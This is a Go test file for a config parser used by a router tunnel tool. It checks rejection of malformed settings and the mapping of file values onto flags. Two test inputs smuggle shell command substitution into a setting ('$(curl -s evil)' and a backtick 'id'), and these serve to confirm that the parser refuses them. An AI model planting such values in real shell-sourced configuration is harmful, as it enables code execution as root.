package deployconf

import (
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// write puts content in a temp file and returns its path.
func write(t *testing.T, content string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "gotun.conf")
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

// The files the repository ships must parse. They are the real input -- an
// invented fixture is how a parser passes its tests and fails on the router.
func TestLoad_TheShippedExamplesParse(t *testing.T) {
	for _, c := range []struct {
		file   string
		schema Schema
	}{
		{"gotun.conf.example", GotunConf},
		{"gotun-dns.conf.example", GotunDNSConf},
	} {
		path := filepath.Join("../../deploy/openwrt", c.file)
		conf, err := Load(path, c.schema)
		if err != nil {
			t.Errorf("%s does not parse, yet it is what an operator copies: %v", c.file, err)
			continue
		}
		// And it must set every variable it documents, or the example is
		// teaching a setting the parser does not accept.
		for _, k := range c.schema.Keys() {
			if _, ok := conf.Get(k); !ok {
				t.Errorf("%s documents no value for %s", c.file, k)
			}
		}
	}
}

func TestLoad_Rejections(t *testing.T) {
	for _, c := range []struct {
		name    string
		conf    string
		wantErr []string // substrings that must all appear
	}{
		{
			// A typo used to read as a knob that silently did nothing.
			name:    "unknown setting",
			conf:    "GOTUN_MARK_IFACES=br-lan\n",
			wantErr: []string{"unknown setting", "GOTUN_MARK_IFACES", "GOTUN_MARK_IFACE"},
		},
		{
			name:    "unknown setting with no near match",
			conf:    "GOTUN_WHATEVER=1\n",
			wantErr: []string{"unknown setting", "gotun.conf.example"},
		},
		{
			// This had happened: thirty lines apart, with different values.
			// Sourced by a shell, the second silently won.
			name:    "assigned twice",
			conf:    "GOTUN_IPV6=off\nGOTUN_LAN=10.0.0.0/8\nGOTUN_IPV6=auto\n",
			wantErr: []string{"already set on line 1", "GOTUN_IPV6"},
		},
		{
			name:    "not an assignment",
			conf:    "GOTUN_LAN=10.0.0.0/8\nreboot\n",
			wantErr: []string{"not a comment or an assignment", "reboot"},
		},
		{
			// The file used to be sourced as root at boot by three services.
			name:    "command substitution",
			conf:    "GOTUN_ENDPOINT=$(curl -s evil)\n",
			wantErr: []string{"command substitution"},
		},
		{
			name:    "backtick substitution",
			conf:    "GOTUN_ENDPOINT=`id`\n",
			wantErr: []string{"command substitution"},
		},
		{
			// Refused rather than stripped: a shell assigned the value and
			// dropped the comment, and silently agreeing with that is worth
			// less than saying where the comment belongs.
			name:    "trailing comment",
			conf:    "GOTUN_IPSEC_MTU=1400 # pppoe\n",
			wantErr: []string{"trailing comment", "own line"},
		},
		{
			name:    "a value the flag rejects is caught by Into, not Load",
			conf:    "GOTUN_FAIL_MODE=sideways\n",
			wantErr: nil,
		},
	} {
		t.Run(c.name, func(t *testing.T) {
			_, err := Load(write(t, c.conf), GotunConf)
			if len(c.wantErr) == 0 {
				if err != nil {
					t.Fatalf("want no error from Load, got %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("want an error mentioning %v, got none", c.wantErr)
			}
			for _, want := range c.wantErr {
				if !strings.Contains(err.Error(), want) {
					t.Errorf("error %q does not mention %q", err, want)
				}
			}
		})
	}
}

func TestLoad_Accepts(t *testing.T) {
	conf, err := Load(write(t, strings.Join([]string{
		"# a comment",
		"",
		"   # an indented comment",
		"GOTUN_LAN=10.0.0.0/8",
		`GOTUN_MARK_IFACE="br-lan,ipsec0"`,
		"GOTUN_CLIENTS_IFACE='ipsec0'",
		"export GOTUN_IPV6=auto",
		"  GOTUN_FAIL_MODE = open  ",
		"GOTUN_DIRECT_SRC=",
	}, "\n")), GotunConf)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct{ key, want string }{
		{"GOTUN_LAN", "10.0.0.0/8"},
		{"GOTUN_MARK_IFACE", "br-lan,ipsec0"}, // quotes stripped
		{"GOTUN_CLIENTS_IFACE", "ipsec0"},
		{"GOTUN_IPV6", "auto"}, // export accepted
		{"GOTUN_FAIL_MODE", "open"},
		{"GOTUN_DIRECT_SRC", ""}, // set, and set to empty
	} {
		got, ok := conf.Get(c.key)
		if !ok {
			t.Errorf("%s was not read at all", c.key)
			continue
		}
		if got != c.want {
			t.Errorf("%s = %q, want %q", c.key, got, c.want)
		}
	}
}

// watchFlagSet is a stand-in for the real one, with the defaults that matter
// here. The real flag sets are compared against these mappings by a test in
// internal/cli, which is where they live.
func watchFlagSet() (*flag.FlagSet, map[string]*string) {
	fs := flag.NewFlagSet("watch", flag.ContinueOnError)
	v := map[string]*string{}
	for _, f := range []struct{ name, def string }{
		{"prefixes", ""},
		{"endpoint", ""},
		{"tunnel-iface", "wg-exit"},
		{"lan", ""},
		{"mark-iface", ""},
		{"clients-iface", ""},
		{"direct-src", ""},
		{"fail-mode", "open"},
		{"ipv6", "auto"},
		{"ipv6-fallback", "direct"},
		{"health-listen", ""},
		{"probe-target", "1.1.1.1:443"},
		{"probe-interval", "1m0s"},
		{"fail-after", "3"},
		{"recover-after", "2"},
	} {
		v[f.name] = fs.String(f.name, f.def, "")
	}
	return fs, v
}

func TestInto_FillsWhatTheFileSets(t *testing.T) {
	conf, err := Load(write(t, "GOTUN_LAN=10.0.0.0/8\nGOTUN_IPV6=off\n"), GotunConf)
	if err != nil {
		t.Fatal(err)
	}
	fs, v := watchFlagSet()
	if err := fs.Parse(nil); err != nil {
		t.Fatal(err)
	}
	if err := conf.Into(fs, WatchFlags); err != nil {
		t.Fatal(err)
	}
	if *v["lan"] != "10.0.0.0/8" {
		t.Errorf("-lan = %q", *v["lan"])
	}
	if *v["ipv6"] != "off" {
		t.Errorf("-ipv6 = %q", *v["ipv6"])
	}
}

// The property the whole refactor rests on. The init scripts expanded an unset
// variable into an empty string and handed that to the flag, overriding the Go
// default with nothing -- which is how -tunnel-iface came to be passed as "".
// A variable the file does not set must not be passed at all.
func TestInto_AnAbsentSettingLeavesTheGoDefault(t *testing.T) {
	conf, err := Load(write(t, "GOTUN_LAN=10.0.0.0/8\n"), GotunConf)
	if err != nil {
		t.Fatal(err)
	}
	fs, v := watchFlagSet()
	if err := fs.Parse(nil); err != nil {
		t.Fatal(err)
	}
	if err := conf.Into(fs, WatchFlags); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct{ name, want string }{
		{"tunnel-iface", "wg-exit"},
		{"ipv6", "auto"},
		{"ipv6-fallback", "direct"},
		{"fail-mode", "open"},
		{"probe-target", "1.1.1.1:443"},
	} {
		if got := *v[c.name]; got != c.want {
			t.Errorf("-%s = %q with %s absent from the file, want the Go default %q",
				c.name, got, "its variable", c.want)
		}
	}
}

// An explicit flag wins, so a bad value in the file can be overridden with a
// one-line edit to the init script rather than a reflash.
func TestInto_AnExplicitFlagWins(t *testing.T) {
	conf, err := Load(write(t, "GOTUN_IPV6=off\nGOTUN_LAN=10.0.0.0/8\n"), GotunConf)
	if err != nil {
		t.Fatal(err)
	}
	fs, v := watchFlagSet()
	if err := fs.Parse([]string{"-ipv6", "on"}); err != nil {
		t.Fatal(err)
	}
	if err := conf.Into(fs, WatchFlags); err != nil {
		t.Fatal(err)
	}
	if *v["ipv6"] != "on" {
		t.Errorf("-ipv6 = %q, want the explicitly passed on rather than the file's off", *v["ipv6"])
	}
	if *v["lan"] != "10.0.0.0/8" {
		t.Errorf("-lan = %q: one explicit flag must not stop the rest being filled in", *v["lan"])
	}
}

// gotun.conf also carries the xfrm settings, which `watch` has no flags for.
// Reading it for one command must not be derailed by the other command's
// settings being present.
func TestInto_IgnoresAnotherCommandsSettings(t *testing.T) {
	conf, err := Load(write(t, "GOTUN_LAN=10.0.0.0/8\nGOTUN_IPSEC_IFACE=ipsec0\n"), GotunConf)
	if err != nil {
		t.Fatal(err)
	}
	fs, v := watchFlagSet()
	if err := fs.Parse(nil); err != nil {
		t.Fatal(err)
	}
	if err := conf.Into(fs, WatchFlags); err != nil {
		t.Fatalf("reading gotun.conf for watch must tolerate the ipsec settings: %v", err)
	}
	if *v["lan"] != "10.0.0.0/8" {
		t.Errorf("-lan = %q", *v["lan"])
	}
}

// A mapping that names a flag its own command does not define is a bug in the
// mapping. It must say so rather than silently doing nothing, which is the
// failure mode this package exists to remove.
func TestInto_RefusesAMappingThatNamesAnUnknownFlag(t *testing.T) {
	conf, err := Load(write(t, "GOTUN_LAN=10.0.0.0/8\n"), GotunConf)
	if err != nil {
		t.Fatal(err)
	}
	fs := flag.NewFlagSet("watch", flag.ContinueOnError)
	if err := fs.Parse(nil); err != nil {
		t.Fatal(err)
	}
	err = conf.Into(fs, Mapping{"GOTUN_LAN": "lan"})
	if err == nil {
		t.Fatal("want an error: the flag set defines no -lan")
	}
	if !strings.Contains(err.Error(), "does not define") {
		t.Errorf("error %q does not explain itself", err)
	}
}

func TestInto_ReportsAValueTheFlagRejects(t *testing.T) {
	conf, err := Load(write(t, "GOTUN_FAIL_AFTER=soon\n"), GotunConf)
	if err != nil {
		t.Fatal(err)
	}
	fs := flag.NewFlagSet("watch", flag.ContinueOnError)
	fs.Int("fail-after", 3, "")
	if err := fs.Parse(nil); err != nil {
		t.Fatal(err)
	}
	err = conf.Into(fs, Mapping{"GOTUN_FAIL_AFTER": "fail-after"})
	if err == nil {
		t.Fatal("want an error for a non-numeric fail-after")
	}
	for _, want := range []string{"GOTUN_FAIL_AFTER", "soon"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q does not mention %q, so an operator cannot find the line", err, want)
		}
	}
}

// Two variables pointing at one flag would make the file's meaning depend on
// map iteration order.
func TestMappings_AreOneToOne(t *testing.T) {
	for name, m := range map[string]Mapping{
		"WatchFlags": WatchFlags, "IPsecFlags": IPsecFlags, "DNSFlags": DNSFlags,
	} {
		seen := map[string]string{}
		for key, f := range m {
			if other, dup := seen[f]; dup {
				t.Errorf("%s maps both %s and %s to -%s", name, other, key, f)
			}
			seen[f] = key
		}
	}
}

// Where two mappings over one file use the same flag name, it must come from
// the same key.
//
// Sharing a name is not in itself wrong -- GOTUN_IPSEC_IFID feeds -if-id for
// both `gotun ipsec` and `gotun ikev2`, deliberately, because it is one number
// and a device and a connection carrying different if_ids negotiate perfectly
// and then deliver packets nowhere. What must not happen is two *different*
// keys feeding one flag name, because then one command's setting silently fills
// another's flag, which is the class of mix-up the shell mapping allowed.
func TestGotunConf_SharedFlagNamesComeFromOneKey(t *testing.T) {
	owner := map[string]string{} // flag name -> the key allowed to set it
	for _, m := range GotunConf.Mappings {
		for key, name := range m {
			if prev, seen := owner[name]; seen && prev != key {
				t.Errorf("-%s is fed by both %s and %s; one command's setting would fill"+
					" the other's flag", name, prev, key)
			}
			owner[name] = key
		}
	}
}

// The gateway settings must reach `gotun ikev2 user add`, the command that
// issues a credential and writes the profile in one step. Before this, every
// invocation repeated a dozen flags describing the same gateway, and each
// repetition was a chance to describe one slightly unlike the gateway running
// -- which yields a profile that installs cleanly and then does not connect.
func TestInto_IKEv2GatewayComesFromTheConfig(t *testing.T) {
	conf, err := Load(filepath.Join("../../deploy/openwrt", "gotun.conf.example"), GotunConf)
	if err != nil {
		t.Fatal(err)
	}
	fs := flag.NewFlagSet("ikev2 user add", flag.ContinueOnError)
	vals := map[string]*string{}
	for _, name := range IKEv2UserFlags {
		vals[name] = fs.String(name, "", "")
	}
	if err := fs.Parse(nil); err != nil {
		t.Fatal(err)
	}
	if err := conf.Into(fs, IKEv2UserFlags); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct{ flag, want string }{
		{"gateway-id", "vpn.home"},
		{"vip-subnet", "10.231.17.0/24"},
		{"vip-gateway", "10.231.17.1"},
		{"pool", "10.231.17.16/28"},
		{"dns-match", "all"},
		{"dir", "/etc/swanctl/conf.d"},
		{"if-id", "0x61"}, // GOTUN_IPSEC_IFID, shared with gotun ipsec
	} {
		if got := *vals[c.flag]; got != c.want {
			t.Errorf("-%s = %q, want %q", c.flag, got, c.want)
		}
	}
}

// Each mapping must work against the flag set of its own command. This is the
// test that was missing: with one mapping shared between apply and watch,
// `gotun apply -config` failed outright on GOTUN_RECOVER_AFTER -- a flag apply
// does not define -- and it was found by hand on the router rather than here.
func TestInto_ApplyFlagsWorkAgainstAnApplyOnlyFlagSet(t *testing.T) {
	conf, err := Load(filepath.Join("../../deploy/openwrt", "gotun.conf.example"), GotunConf)
	if err != nil {
		t.Fatal(err)
	}

	// Only the policy flags, as `gotun apply` registers them.
	fs := flag.NewFlagSet("apply", flag.ContinueOnError)
	for _, name := range ApplyFlags {
		fs.String(name, "", "")
	}
	if err := fs.Parse(nil); err != nil {
		t.Fatal(err)
	}
	if err := conf.Into(fs, ApplyFlags); err != nil {
		t.Fatalf("reading the shipped example for apply must work: %v", err)
	}
	// And a sanity check that it filled something in, so a mapping that had
	// quietly become empty could not pass this.
	if got := fs.Lookup("lan").Value.String(); got == "" {
		t.Error("-lan was not filled in, so this test is asserting nothing")
	}
}

// Nothing in ApplyFlags may name a watchdog setting, since apply has no flags
// for them.
func TestApplyFlags_CarryNoWatchdogSettings(t *testing.T) {
	for key := range watchOnlyFlags {
		if name, ok := ApplyFlags[key]; ok {
			t.Errorf("ApplyFlags maps %s to -%s, but that is a watch-only flag", key, name)
		}
	}
}
